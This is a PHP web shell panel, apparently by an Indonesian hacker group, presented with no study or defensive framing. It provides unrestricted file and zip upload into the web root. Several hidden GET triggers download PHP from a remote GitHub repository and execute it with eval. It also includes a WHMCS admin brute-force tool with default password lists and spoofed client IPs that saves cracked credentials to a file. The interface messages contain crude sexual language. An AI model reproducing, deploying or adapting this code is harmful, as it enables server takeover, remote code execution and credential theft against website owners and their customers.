echo '<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#666666" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1"><tr><a bookmark="minipanel" style="font-weight: normal; color: #009900; font-family: verdana; text-decoration: none"><td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px"><center><br><form method="POST" enctype="multipart/form-data"><input type="hidden" name="act" value="upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="file" name="userfile" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="submit" name="submit" value="Upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><br><br>';
}
{
$x174 = "";
$x175 = $x174 . basename($x28['userfile']['name']);
if (isset($x28['userfile']['name'])) {
        if (move_uploaded_file($x28['userfile']['tmp_name'], $x175)) {
                echo "Filemu ". basename($x28['userfile']['name']) ." Berhasil Diupload ^_^ ";
        } else {
                echo "Oraiso Diupload Cook!";
        }
}

echo '</form></center></td></tr></table></a>';
}
if ( isset($_GET['UaeZ']) )
{
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
    function rmdir_recursive($x170) {
    foreach(scandir($x170) as $x29) {
    if ('.' === $x29 || '..' === $x29) continue;
    if (is_dir("$x170/$x29")) rmdir_recursive("$x170/$x29");
    else unlink("$x170/$x29");
    }
     
    rmdir($x170);
    }
     
    if($x28["zip_file"]["name"]) {
    $xb8 = $x28["zip_file"]["name"];
    $x176 = $x28["zip_file"]["tmp_name"];
    $x9a = $x28["zip_file"]["type"];
     
    $x48 = explode(".", $xb8);
    $x177 = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($x177 as $x178) {
    if($x178 == $x9a) {
    $x179 = true;
    break;
    }
    }
     
    $x17a = strtolower($x48[1]) == 'zip' ? true : false;
    if(!$x17a) {
    $x19 = "The file you are trying to upload is not a .zip file. Please try again.";
    }
     
    /* PHP current path */
    $xb7 = dirname(__FILE__).'/'; // absolute path to the directory where zipper.php is in
    $x17b = basename ($xb8, '.zip'); // absolute path to the directory where zipper.php is in (lowercase)
    $x17b = basename ($x17b, '.ZIP'); // absolute path to the directory where zipper.php is in (when uppercase)
     
    $x17c = $xb7 . $x17b; // target directory
    $x17d = $xb7 . $xb8; // target zip file
     
    /* create directory if not exists', otherwise overwrite */
    /* target directory is same as filename without extension */
     
    if (is_dir($x17c)) rmdir_recursive ( $x17c);
     
     
    mkdir($x17c, 0777);
     
     
    /* here it is really happening */
     
    if(move_uploaded_file($x176, $x17d)) {
    $x17e = new ZipArchive();
    $xc2 = $x17e->open($x17d); // open the zip file to extract
    if ($xc2 === true) {
    $x17e->extractTo($x17c); // place in the directory with same name
    $x17e->close();
     
    unlink($x17d);
    }
    $x19 = "Auuugghhh,... Kontolmu Tante Masukin di Dalam Vagina Tante Auuugghhh,... ";
    } else {	
    $x19 = "Ora Iso Mlebu COK Kontolmu Masuk Angin Paleng ";
    }
    }
     
     


echo '<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif"><meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<font class="hk2" style="text-shadow: 1px -1px 8px;"> 
<!--by hacker sakit hati--> 
<body style="background-color:#000000;background-image:url(https://lh3.googleusercontent.com/-4mu4UeGrMZ4/Vnln5iS9iyI/AAAAAAAAALU/peGMSKQ8Fo0/w859-h483-n-no/541418_130940813763941_862797218_n.jpg);background-repeat:no-repeat;background-position:top;" bgcolor="#000000"><center>
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style><style type="text/css"><!-- a:link{color:#ffffff;text-decoration:none}--></style> ';
{if($x19) echo "<p>$x19</p>";}
echo '<form enctype="multipart/form-data" method="post" action=""><label>Silahkan Masukan Kontol Anda <input type="file" name="zip_file" /></label><input type="submit" name="submit" value="Upload" /></form></body></html>';
}
if ( isset($_GET['ExE']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/email.html";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['PmE']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/exd.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}

if ( isset($_GET['SbN']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/65243twazfsddd6ur.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}

	if ( isset($_GET['SmpK']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/sempak.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['RmDs']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/53278798366rmd.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['SwPJmPL']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/ad432141asdfsdj%20wpjmbrt.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['back']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/749209288231546dcnfdr343.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['Whmcz211']) )
{

echo "<html><head><link rel=\"SHORTCUT ICON\" href=\"http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif\"><title> >-|I|-> HsH 2011 <-|I|-< </title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"><style> body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px } A:link {text-decoration: none;color: aqua;} A:active {text-decoration: none;color: aqua;} A:visited {text-decoration: none;color: lime;} A:hover {text-decoration: underline; color: Fuchsia;} #new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;} input:hover,tr:hover,td:hover{background-color:  ; color: aqua;} </style><style type=\"text/css\"></style><style type=\"text/css\"></style></head><center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
echo "<textarea rows='15' cols='45' name=\"site\">http://target.com/admin/</textarea>\n"; 
echo "<textarea rows='15' cols='30' name=\"user\">admin \n"; 
echo "demo\n"; 
echo "admin123\n"; 
echo "</textarea><textarea rows='15' cols='30' name=\"pass\">\n"; 
echo "admin\n"; 
echo "123456\n"; 
echo "password\n"; 
echo "102030\n"; 
echo "123123\n"; 
echo "12345\n"; 
echo "123456789\n"; 
echo "pass\n"; 
echo "test\n"; 
echo "admin123\n"; 
echo "demo\n"; 
echo "!@#$%^\n"; 
echo "</textarea><br><input type=\"submit\" name='start' value=\" [ P L A Y ] \" /></form></center>\n";
 set_time_limit(0); 
    error_reporting(0); 
    @apache_setenv('no-gzip', 1); 
    @ini_set('zlib.output_compression', 0); 
    @ini_set('implicit_flush', 1); 
    for($x8c=0;$x8c<= ob_get_level(); $x8c++) 
    { 
        ob_end_flush(); 
    } 
    ob_implicit_flush(1); 
 function check_ip($x17f) { 
    if ((!empty($x17f) && ip2long($x17f) != 0 - 1) && ip2long($x17f) != false) { 
        $x180 = array(array("0.0.0.0", "2.255.255.255"), array("10.0.0.0", "10.255.255.255"), array("127.0.0.0", "127.255.255.255"), array("169.254.0.0", "169.254.255.255"), array("172.16.0.0", "172.31.255.255"), array("192.0.2.0", "192.0.2.255"), array("192.168.0.0", "192.168.255.255"), array("255.255.255.0", "255.255.255.255")); 
        foreach ($x180 as $x11d) { 
            $x181 = ip2long($x11d[0]); 
            $x182 = ip2long($x11d[1]); 

            if ($x181 <= ip2long($x17f) && ip2long($x17f) <= $x182) { 
                return false; 
                continue; 
            } 
        } 

        return true; 
    } 

    return false; 
} 
function login($x0f,$x102,$x114){ 
    global $x17f; 

    $x183 = array('username'=>$x102,'password'=>$x114,'rememberme'=>'on'); 

    $xf6 = curl_init(); 
    curl_setopt($xf6,CURLOPT_URL,"$x0f/dologin.php"); 
    curl_setopt($xf6,CURLOPT_SSL_VERIFYHOST,false); 
    curl_setopt($xf6,CURLOPT_SSL_VERIFYPEER,false); 
    curl_setopt($xf6,CURLOPT_RETURNTRANSFER,true); 
    curl_setopt($xf6,CURLOPT_HTTPHEADER,array("CLIENT-IP: $x17f")); 
    curl_setopt($xf6,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; rv:17.0) Gecko/20100101 Firefox/17.0'); 
    curl_setopt($xf6,CURLOPT_POST,true); 
    curl_setopt($xf6,CURLOPT_POSTFIELDS,$x183); 
    curl_setopt($xf6,CURLOPT_HEADER,true); 
    curl_setopt($xf6,CURLOPT_REFERER,"$x0f/login.php"); 
    $xe7 = curl_exec($xf6); 
    curl_close($xf6); 
    //echo $xe7; 
    if(preg_match('/Location\: index\.php/',$xe7)){ 
        return true; 
    }else{ 
        return false; 
    } 
} 
if($_POST['start']){ 
$xb2=fopen("HsH-whmcs.txt","a+"); 


 foreach(explode("\n",$_POST['site']) as $xf4){ 
   $xf4=trim($xf4); 
foreach(explode("\n",$_POST['user']) as $x102){ 
    $x102 = trim($x102); 
    foreach(explode("\n",$_POST['pass']) as $x114){ 
        $x114 = trim($x114); 
        echo "<font color='lime'><br>Scann $xf4 | $x102 | $x114<br></font> "; 

        while (true) { 
            $x17f = long2ip(rand(11111,99999999999)); 
            if(!@in_array($x17f,$x184)&&check_ip($x17f)){ 
                $x184[] = $x17f; 
                break; 
            } 
        } 

        if(login($xf4,$x102,$x114)){ 
            echo "<center><font size='5' color='aqua'><br>[+] $xf4 <br> [+]user : $x102.<br> password:$x114\n<br></font></center>"; 

            fwrite($xb2,"Target : $xf4\r\nUsername : $x102\r\nPassword : $x114\r\n===================================\r\n"); 
            break; 
        }else{ 
            echo "Ora Kenek COK \n"; 
        } 
    } 
} 
} 


    } 


}

if ( isset($_GET['ExTrPCc']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/7ryqoioaiwjizsuh%5Bq9ueraidkd3XtR4p4c35.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['DdCc']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/63y5w6789tuyfiuxtydcfczgdxthgfsCr4xD3C0dCC586.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
?>
